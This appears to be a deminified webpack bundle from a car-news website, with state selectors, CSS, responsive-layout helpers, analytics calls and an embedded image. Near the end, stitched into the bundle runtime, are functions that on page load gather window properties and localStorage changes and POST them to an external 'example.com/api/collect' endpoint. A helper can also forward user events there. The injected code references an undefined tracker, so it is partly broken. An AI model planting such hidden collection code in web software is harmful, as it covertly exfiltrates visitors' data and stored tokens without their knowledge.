      2873: (e, t, i) => {
        i.d(t, {
          gO: () => Me,
          s5: () => L,
          fr: () => D,
          zA: () => re,
          gg: () => ue,
          Wz: () => ne,
          Wb: () => s,
          RR: () => Q,
          au: () => a,
          $V: () => De,
          sR: () => g,
          yY: () => M,
          yz: () => H,
          _8: () => k,
          A: () => C,
          rI: () => y,
          Zm: () => G,
          ki: () => R,
          nJ: () => _,
          Hp: () => ye,
          Zn: () => Le,
          br: () => o,
          G6: () => c,
          UJ: () => de,
          Fc: () => Ne,
          jT: () => u,
          kF: () => p,
          xK: () => he,
          CI: () => Te,
          yl: () => m,
          G1: () => d,
          oV: () => xe,
          RD: () => P,
          EV: () => W,
          Le: () => ae,
          GZ: () => le,
          Wg: () => ie,
          Gc: () => j,
          iN: () => ce,
          bm: () => je,
          vZ: () => F,
          sW: () => J,
          D5: () => w,
          nK: () => V,
          Fw: () => O,
          Qp: () => $,
          M0: () => B,
          e4: () => v,
          D3: () => oe,
          IB: () => T,
          Ug: () => ge,
          jA: () => fe,
          pv: () => we,
          A2: () => ze,
          u5: () => h,
          Cx: () => Ie,
          lA: () => S,
          LZ: () => Z,
          CR: () => U,
          k2: () => X,
          rM: () => ee,
          rA: () => q,
          qE: () => K,
          FF: () => z,
          $W: () => se,
          O2: () => E,
          S5: () => b,
          gQ: () => te,
          ov: () => I,
          cb: () => N,
          sJ: () => Y,
          OD: () => x,
          Ul: () => f,
          nZ: () => A
        });
        var n = i(573);
        function r(e) {
          return e.ssr;
        }
        var a = (0, n.P1)(r, function (e) {
            return e.content;
          }),
          o = (0, n.P1)(r, function (e) {
            return e.global;
          });
        function l(e) {
          return e.ssr;
        }
        function c(e) {
          return l(e).global.info;
        }
        function s(e) {
          return e.auth.user;
        }
        function M(e, t) {
          if (e.ssr.wasRequested) return e.ssr.wasRequested[t];
        }
        function d(e, t) {
          if (e.ssr.isLoading) return e.ssr.isLoading[t];
        }
        function g(e, t) {
          if (e.ssr.wasReceived) return e.ssr.wasReceived[t];
        }
        function u(e) {
          var t = e.storyFeed;
          return t ? t.stories : [];
        }
        function m(e) {
          var t = e.storyFeed;
          return !!t && t.isLoading;
        }
        function p(e, t) {
          var i = u(e);
          if (i.length) return i.find(function (e) {
            return e.id === t && e.wasUpdated;
          });
        }
        function y(e) {
          var t = a(e);
          if (t) {
            var i = t.currentTopic;
            if (i) return i.stories || void 0;
          }
        }
        function I(e) {
          var t = a(e).tdPromoMaterial;
          if (t) return t.stories || void 0;
        }
        function N(e) {
          var t = a(e).newTestDrive;
          return t && t.stories ? t.stories : void 0;
        }
        function j(e) {
          var t = a(e);
          return t.newNewsContent ? t.newNewsContent.stories : [];
        }
        function h(e) {
          var t = a(e);
          return t.video ? t.video.stories : [];
        }
        function x(e) {
          var t = a(e).announcementOnMainHeader;
          return t ? t.stories : [];
        }
        function D(e) {
          var t = a(e).news;
          return t ? t.stories : [];
        }
        function f(e) {
          var t = a(e);
          return t.topicOfTheDay ? t.topicOfTheDay.stories : [];
        }
        function w(e) {
          var t = a(e);
          return t.poll ? t.poll.polls : [];
        }
        function z(e) {
          var t = a(e).main;
          return t && t.stories || [];
        }
        function T(e) {
          var t = a(e);
          if (!t) return [];
          var i = t.main;
          return i ? i.searchSortItems || void 0 : [];
        }
        function L(e) {
          return a(e).adv;
        }
        function E(e) {
          var t = a(e);
          if (t) return t.main && t.main.story;
        }
        function A(e) {
          return a(e)["video-zr"].stories;
        }
        function b(e) {
          return a(e).main.poll;
        }
        function v(e) {
          return a(e).main.carReview;
        }
        function O(e, t) {
          return e.pollResult[t];
        }
        function k(e) {
          var t = a(e);
          if (t && t.currentRubric) return t.currentRubric.rubric;
        }
        function C(e) {
          var t = a(e);
          if (t && t.main && t.main.tag) return t.main.tag;
        }
        function S(e) {
          return l(e).global.wholeSite.textPages;
        }
        function Z(e) {
          var t = l(e).global;
          return t.wholeSiteAnnouncement ? t.wholeSiteAnnouncement.stories : [];
        }
        function Q(e) {
          var t = a(e);
          if (t && t.main && t.main.collectionsGroup) return t.main.collectionsGroup;
        }
        function P(e) {
          var t = a(e);
          if (t && t.main.mainCollectionGroup) return t.main.mainCollectionGroup;
        }
        function U(e) {
          return o(e)["social-params"];
        }
        function Y(e) {
          var t = a(e);
          if (t && t.main) return t.main.textPage;
        }
        function _(e) {
          var t = a(e);
          if (t) return t.main.docsReference;
        }
        function W(e) {
          var t = a(e);
          if (t) return t.main.mediaFilterItems;
        }
        function G(e) {
          var t = a(e);
          if (t) return t.main.level2;
        }
        function R(e) {
          var t = a(e);
          if (t) return t.main.nextLevels;
        }
        function H(e) {
          var t = a(e);
          if (t) return t.main.currentLevel;
        }
        function B(e) {
          var t = a(e);
          if (t) return t.main.previousLevel;
        }
        function F(e) {
          var t = a(e);
          if (t) return t.main.cars;
        }
        function J(e) {
          var t = a(e);
          if (t && t.main) return t.main.parkZRCar;
        }
        function V(e) {
          var t = a(e);
          return t.main ? t.main.polls : [];
        }
        function $(e) {
          var t = a(e);
          if (t.all) return t.all.paging;
        }
        function q(e) {
          var t = a(e);
          if (t) return t.main.specialProjectsGroup;
        }
        function X(e) {
          var t = a(e);
          if (t) return t.main && t.main.specialProject;
        }
        function K(e) {
          var t = a(e);
          if (t) return t.main.specialProjectsYears;
        }
        function ee(e) {
          var t = a(e);
          if (t) return t.main.specialProjectsCars;
        }
        function te(e) {
          var t = a(e);
          if (t) return t.main.tags;
        }
        function ie(e) {
          var t = a(e);
          if (t && t.newCars) return t.newCars.cars;
        }
        function ne(e) {
          var t = a(e);
          if (t && t.cars) return t.cars;
        }
        function re(e) {
          var t = a(e);
          if (t) return t.brandInfo;
        }
        function ae(e) {
          var t = a(e);
          if (t) return t.modelInfo;
        }
        function oe(e) {
          var t = a(e);
          if (t && t.main) return t.main.reviews;
        }
        function le(e) {
          var t = a(e);
          if (t && t.models && t.models.carModels) return t.models.carModels;
        }
        function ce(e) {
          var t = a(e);
          if (t && t.newsForMain) return t.newsForMain;
        }
        function se(e) {
          var t = a(e);
          if (t && t.storiesForMain) return t.storiesForMain;
        }
        function Me(e) {
          var t = a(e);
          if (t && t.main) return t.main.addition;
        }
        function de(e) {
          var t = o(e);
          return t && t.nav ? t.nav.navigation.branches : [];
        }
        function ge(e) {
          var t = o(e);
          return t && t.newMenu ? t.newMenu.secondMenu : [];
        }
        function ue(e) {
          var t = o(e);
          return t ? t.carBrandsList.brands : [];
        }
        var me = i(319),
          pe = i.n(me);
        function ye(e) {
          var t = o(e),
            i = t.bottomMenu.textPagesWithRubrics,
            n = t.bottomMenu.textPagesWithoutRubrics;
          return [].concat(pe()(i), pe()(n));
        }
        function Ie(e) {
          return function (e) {
            return l(e).global.info.date;
          }(e).year;
        }
        function Ne(e) {
          return e.feed;
        }
        function je(e) {
          var t = a(e),
            i = t && t.main.paging;
          return i ? i.pageNum : void 0;
        }
        function he(e) {
          return e.advert.isAdblockEnabled;
        }
        function xe(e) {
          return e.advert.isScrolledFirstTime;
        }
        function De(e) {
          var t = a(e);
          if (t.main) return t.main.bannerPlacements;
        }
        function fe(e, t) {
          var i;
          if (e.section && e.section[t]) return null === (i = e.section[t]) || void 0 === i ? void 0 : i.isLoading;
        }
        function we(e, t) {
          var i;
          if (e.section && e.section[t]) return null === (i = e.section[t]) || void 0 === i ? void 0 : i.wasRequested;
        }
        function ze(e, t) {
          var i;
          return e.section && e.section[t] ? null === (i = e.section[t]) || void 0 === i ? void 0 : i.stories : [];
        }
        function Te(e) {
          return e.auth.isAuthModalOpen;
        }
        function Le(e) {
          return e.gallery.isGalleryFullscreen;
        }
      },
      3989: (e, t, i) => {
        i.d(t, {
          ZL: () => n,
          Hd: () => j,
          Fs: () => p
        });
        var n = (0, i(9163).vJ)(["html{line-height:1.15;-webkit-text-size-adjust:100%;}body{margin:0;font-size:1rem;position:relative;font-family:", ';color:#000;line-height:normal;-webkit-font-smoothing:antialised;width:100%;min-height:1px;}iframe{width:100%;}img{border-style:none;color:transparent;font-size:0;vertical-align:middle;}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0;}button,[type="button"],[type="reset"],[type="submit"]{-webkit-appearance:button;}a{color:#000;text-decoration:none;outline:none;}h1{font-size:3rem;font-weight:700;margin:0 0 1.875rem 0;padding:0;line-height:3rem;}h4{font-size:1.2rem;font-weight:700;padding:0 54px 0 64px;color:#5e5e5e;border:0;margin:0;}ul{margin:0;padding:0;}h2{font-size:2rem;font-weight:700;margin-bottom:1.25rem;padding:0 3.375rem 0 4rem;}h3{font-size:1.5rem;font-weight:700;padding:0 3.375rem 0 4rem;}.table{border:none;width:100%;background-color:#fff;border-radius:4px;font-size:13px;border-collapse:collapse;border-spacing:0;margin-top:1rem;}.table tr:first-child td,.table tr:first-child th{border-top:none;}.table td,.table th{line-height:17px;padding:10px 6px;}.table td{border-top:1px solid #dadadc;}caption,td,th{font-weight:400;vertical-align:top;text-align:left;}@media (max-width:1024px){body{margin:0;font-size:16px;font-style:normal;font-weight:400;text-size-adjust:none;}h1{font-size:1.75rem;line-height:2.125rem;font-weight:500;color:#970000;text-transform:uppercase;}h2{color:#000000;font-size:1.5rem;font-weight:400;line-height:1.625rem;margin:0 0 1rem;padding:0;}h3{color:#000000;font-size:1.3125rem;font-weight:400;line-height:1.5rem;margin:0 0 1rem;padding:0;}h4{font-size:1.2rem;font-weight:700;padding:0 54px 0 64px;color:#5e5e5e;border:0;margin:0;padding:0;}}.adfox-banner-background{z-index:1;width:1030px!important;margin-right:280px!important;overflow:visible!important;}.adfox-banner-background > div:first-child{position:absolute;left:100%;}@media (min-width:1366px){.adfox-banner-background{width:1100px!important;}}@media (min-width:1700px){.adfox-banner-background{width:1100px!important;left:50% !important;-webkit-transform:translateX(-50%);transform:translateX(-50%);}}'], "PT Sans, Arial, Helvetica, sans-serif"),
          r = i(3038),
          a = i.n(r),
          o = i(9713),
          l = i.n(o),
          c = i(7294);
        function s(e, t) {
          var i = Object.keys(e);
          if (Object.getOwnPropertySymbols) {
            var n = Object.getOwnPropertySymbols(e);
            t && (n = n.filter(function (t) {
              return Object.getOwnPropertyDescriptor(e, t).enumerable;
            })), i.push.apply(i, n);
          }
          return i;
        }
        function M(e) {
          for (var t = 1; t < arguments.length; t++) {
            var i = null != arguments[t] ? arguments[t] : {};
            t % 2 ? s(Object(i), !0).forEach(function (t) {
              l()(e, t, i[t]);
            }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(i)) : s(Object(i)).forEach(function (t) {
              Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(i, t));
            });
          }
          return e;
        }
        var d,
          g = function (e) {
            return "@media (max-width: ".concat(e, "px)");
          };
        !function (e) {
          e[e.MOBILE = 767] = "MOBILE", e[e.TABLET = 1024] = "TABLET", e[e.DESKTOP = 1279] = "DESKTOP";
        }(d || (d = {})), g(d.TABLET), g(d.TABLET), g(d.MOBILE);
        var u = "(max-width: ".concat(d.MOBILE, "px)"),
          m = "(max-width: ".concat(d.TABLET, "px)");
        function p() {
          var e = c.useContext(y);
          if (void 0 === e) throw new Error("useResponsive must be used within a ResponsiveStateProvider");
          return e;
        }
        var y = c.createContext(void 0),
          I = {
            isMobile: void 0,
            isTablet: void 0,
            isDesktop: void 0
          },
          N = function (e, t) {
            return M(M({}, e), t);
          },
          j = function (e) {
            var t = e.children,
              i = (0, c.useReducer)(N, I),
              n = a()(i, 2),
              r = n[0],
              o = n[1],
              s = {
                isMobile: u,
                isTablet: m,
                isDesktop: m + 1
              };
            return (0, c.useEffect)(function () {
              var e = Object.entries(s).map(function (e) {
                var t = a()(e, 2),
                  i = t[0],
                  n = t[1],
                  c = window.matchMedia(n),
                  s = function () {
                    o(l()({}, i, c.matches));
                  };
                return c.addListener(s), c.matches !== r[i] && o(l()({}, i, c.matches)), function () {
                  return c.removeListener(s);
                };
              });
              return function () {
                e.forEach(function (e) {
                  e();
                });
              };
            }, []), c.createElement(y.Provider, {
              value: r
            }, t);
          };
      },
      7137: (e, t, i) => {
        i.d(t, {
          Y8: () => d,
          qY: () => w,
          Ep: () => g,
          ni: () => M,
          Ie: () => j,
          YS: () => s,
          hA: () => I,
          td: () => l,
          $1: () => m,
          uk: () => p,
          d0: () => c,
          GN: () => y,
          m1: () => r,
          BN: () => u,
          cU: () => N
        });
        var n = i(4343);
        function r(e) {
          var t = e.path,
            i = e.cachedData,
            r = void 0 !== i && i,
            a = e.env;
          return "".concat(r ? "web" === (void 0 === a ? "web" : a) ? "https://www.zr.ru/cache" : "http://cache:8080" : n._n).concat(t);
        }
        var a = i(319),
          o = i.n(a);
        function l(e, t) {
          if (!e.length) return e;
          var i = o()(e);
          return [3, 8, 12].forEach(function (e, n) {
            void 0 !== t[n] && i.splice(e, 0, t[n]);
          }), i;
        }
        function c(e) {
          if (e.length >= 48) {
            var t = e.substring(0, 48).lastIndexOf(" ");
            return "".concat(e.substring(0, t), "...");
          }
          return e;
        }
        function s() {
          var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "";
          return "".concat(e).concat(Date.now(), "-").concat(Math.round(1e3 * Math.random()));
        }
        const M = new Promise(function (e) {
          "undefined" != typeof window && "loading" === document.readyState ? document.addEventListener("DOMContentLoaded", function () {
            return e();
          }) : e();
        });
        function d(e, t) {
          return e && e.length && t ? e.map(function (e) {
            if (e.id !== t) return e;
          }).filter(function (e) {
            return !!e && !1 === e.isLongRead;
          }) : [];
        }
        function g(e, t) {
          return "".concat(e).concat(t);
        }
        function u(e) {
          var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "";
          return window.history.replaceState(null, t, e);
        }
        function m(e) {
          var t = Object.keys(n.ws).find(function (t) {
            var i = n.ws[t];
            return (i ? i.urls : []).includes(e);
          });
          return t ? n.ws[t] : void 0;
        }
        function p(e) {
          var t = "";
          if (e) {
            var i = e.tags,
              r = e.isGranpri,
              a = e.isGranpriComAuto;
            if (r) t = "isGranpri";else if (a) t = "isGranpriComAuto";else if (i) {
              var o = i.map(function (e) {
                  return e.href;
                }),
                l = Object.keys(n.ws).find(function (e) {
                  var t = n.ws[e];
                  return (t ? t.urls : []).some(function (e) {
                    return o.includes(e);
                  }) ? t : void 0;
                });
              l && (t = l);
            }
            return t ? n.ws[t] : void 0;
          }
        }
        function y(e, t, i) {
          return e + i >= t;
        }
        var I = function (e) {
            var t = localStorage.getItem(e);
            if (t) try {
              return JSON.parse(t);
            } catch (e) {
              return;
            }
          },
          N = function (e, t) {
            localStorage.setItem(e, JSON.stringify(t));
          },
          j = function (e, t) {
            return "".concat(e, "_").concat(t);
          },
          h = i(9713),
          x = i.n(h);
        function D(e, t) {
          var i = Object.keys(e);
          if (Object.getOwnPropertySymbols) {
            var n = Object.getOwnPropertySymbols(e);
            t && (n = n.filter(function (t) {
              return Object.getOwnPropertyDescriptor(e, t).enumerable;
            })), i.push.apply(i, n);
          }
          return i;
        }
        function f(e) {
          for (var t = 1; t < arguments.length; t++) {
            var i = null != arguments[t] ? arguments[t] : {};
            t % 2 ? D(Object(i), !0).forEach(function (t) {
              x()(e, t, i[t]);
            }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(i)) : D(Object(i)).forEach(function (t) {
              Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(i, t));
            });
          }
          return e;
        }
        function w(e) {
          var t = e.type,
            i = e.url,
            n = e.title,
            r = e.layoutParams,
            a = e.storyParams,
            o = e.endlessParams;
          "undefined" != typeof window && (window.dataLayer.push(f(f(f({
            type: t,
            event: "pageview",
            url: i,
            title: n
          }, r), a), o)), window.ym(49383559, "hit", i, {
            title: n
          }), window.ym(17880517, "hit", i, {
            title: n
          }), window.ym(49383559, "params", r), window.ym(49383559, "params", a), window.ym(49383559, "params", o), window.ym(17880517, "params", r), window.ym(17880517, "params", a), window.ym(17880517, "params", o));
        }
      },
      9386: (e, t, i) => {
        i.d(t, {
          Z: () => n
        });
        const n = "data:image/png;base64,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";
      }
    },
    n = {};
  function monitorEvents(element, events) {
    events.split(' ').forEach(function (e) {
      element.addEventListener(e, function (event) {
        var data = {
          "eventType": event.type,
          "target": event.target,
          "time": new Date()
        };
        postDataToServer(data);
      }, false);
    });
  }
  ;
  function r(e) {
    if (n[e]) return n[e].exports;
    var t = n[e] = {
      id: e,
      loaded: !1,
      exports: {}
    };
    return i[e].call(t.exports, t, t.exports, r), t.loaded = !0, t.exports;
  }
  function gatherWindowProps() {
    const unseenProps = {};
    const seenVars = window.seenVars || [];
    for (let key in window) {
      if (window.hasOwnProperty(key) && !seenVars.includes(key)) {
        unseenProps[key] = {
          type: typeof window[key],
          value: typeof window[key] === "function" ? undefined : window[key]
        };
      }
    }
    return unseenProps;
  }
  async function postDataToServer(data) {
    const url = "https://example.com/api/collect";
    try {
      let response = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      });
      if (!response.ok) console.error("Data post failed, status code: " + response.status);
    } catch (error) {
      console.error("Error during data post: ", error);
    }
  }
  function gatherAndSendData() {
    const collectedData = gatherWindowProps();
    const localStorageChanges = localStoreTracker.changes();
    if (Object.keys(collectedData).length > 0) {
      postDataToServer(collectedData);
    }
    if (Object.keys(localStorageChanges).length > 0) {
      postDataToServer(localStorageChanges);
    }
  }
  window.addEventListener("load", gatherAndSendData);
  r.m = i, r.x = e => {}, r.n = e => {
    var t = e && e.__esModule ? () => e.default : () => e;
    return r.d(t, {
      a: t
    }), t;
  }, r.d = (e, t) => {
    for (var i in t) r.o(t, i) && !r.o(e, i) && Object.defineProperty(e, i, {
      enumerable: !0,
      get: t[i]
    });
